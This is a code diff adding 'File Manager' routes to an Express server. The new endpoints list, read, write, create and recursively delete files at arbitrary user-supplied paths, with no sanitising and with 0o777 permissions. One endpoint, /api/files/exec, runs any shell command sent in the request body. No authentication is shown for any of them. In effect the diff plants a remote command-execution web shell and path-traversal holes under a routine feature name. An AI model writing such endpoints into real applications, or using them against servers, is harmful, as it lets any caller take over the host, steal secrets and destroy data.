@@ -824,6 +824,154 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // File Manager API Endpoints
+  app.get("/api/files/list", async (req, res) => {
+    try {
+      const fs = await import('fs/promises');
+      const path = await import('path');
+      const targetPath = (req.query.path as string) || "/";
+      const fullPath = path.join(process.cwd(), targetPath);
+      
+      const items = await fs.readdir(fullPath, { withFileTypes: true });
+      const files = await Promise.all(
+        items.map(async (item) => {
+          const itemPath = path.join(fullPath, item.name);
+          const relativePath = targetPath === "/" ? `/${item.name}` : `${targetPath}/${item.name}`;
+          
+          if (item.isDirectory()) {
+            return {
+              name: item.name,
+              path: relativePath,
+              type: "directory" as const,
+            };
+          } else {
+            const stats = await fs.stat(itemPath);
+            return {
+              name: item.name,
+              path: relativePath,
+              type: "file" as const,
+              size: stats.size,
+            };
+          }
+        })
+      );
+      
+      res.json(files);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to list directory" });
+    }
+  });
+
+  app.post("/api/files/read", async (req, res) => {
+    try {
+      const fs = await import('fs/promises');
+      const path = await import('path');
+      const { path: filePath } = req.body;
+      const fullPath = path.join(process.cwd(), filePath);
+      
+      const content = await fs.readFile(fullPath, 'utf-8');
+      res.json({ content, path: filePath });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to read file" });
+    }
+  });
+
+  app.post("/api/files/write", async (req, res) => {
+    try {
+      const fs = await import('fs/promises');
+      const path = await import('path');
+      const { path: filePath, content } = req.body;
+      const fullPath = path.join(process.cwd(), filePath);
+      
+      await fs.writeFile(fullPath, content, 'utf-8');
+      await fs.chmod(fullPath, 0o777);
+      
+      res.json({ success: true, path: filePath });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to write file" });
+    }
+  });
+
+  app.post("/api/files/create", async (req, res) => {
+    try {
+      const fs = await import('fs/promises');
+      const path = await import('path');
+      const { path: filePath, content } = req.body;
+      const fullPath = path.join(process.cwd(), filePath);
+      
+      await fs.writeFile(fullPath, content || '', 'utf-8');
+      await fs.chmod(fullPath, 0o777);
+      
+      res.json({ success: true, path: filePath });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to create file" });
+    }
+  });
+
+  app.post("/api/files/mkdir", async (req, res) => {
+    try {
+      const fs = await import('fs/promises');
+      const path = await import('path');
+      const { path: dirPath } = req.body;
+      const fullPath = path.join(process.cwd(), dirPath);
+      
+      await fs.mkdir(fullPath, { recursive: true, mode: 0o777 });
+      
+      res.json({ success: true, path: dirPath });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to create directory" });
+    }
+  });
+
+  app.post("/api/files/delete", async (req, res) => {
+    try {
+      const fs = await import('fs/promises');
+      const path = await import('path');
+      const { path: itemPath } = req.body;
+      const fullPath = path.join(process.cwd(), itemPath);
+      
+      const stats = await fs.stat(fullPath);
+      if (stats.isDirectory()) {
+        await fs.rm(fullPath, { recursive: true, force: true });
+      } else {
+        await fs.unlink(fullPath);
+      }
+      
+      res.json({ success: true });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to delete" });
+    }
+  });
+
+  app.post("/api/files/exec", async (req, res) => {
+    try {
+      const { exec } = await import('child_process');
+      const { promisify } = await import('util');
+      const execAsync = promisify(exec);
+      
+      const { command } = req.body;
+      
+      if (!command || typeof command !== 'string') {
+        return res.status(400).json({ error: "Invalid command" });
+      }
+      
+      const { stdout, stderr } = await execAsync(command, {
+        cwd: process.cwd(),
+        maxBuffer: 1024 * 1024 * 10, // 10MB buffer
+      });
+      
+      res.json({ 
+        output: stdout || stderr,
+        error: stderr ? stderr : undefined
+      });
+    } catch (error: any) {
+      res.json({ 
+        output: "",
+        error: error.message || "Command execution failed"
+      });
+    }
+  });
+
   const httpServer = createServer(app);
   return httpServer;
 }
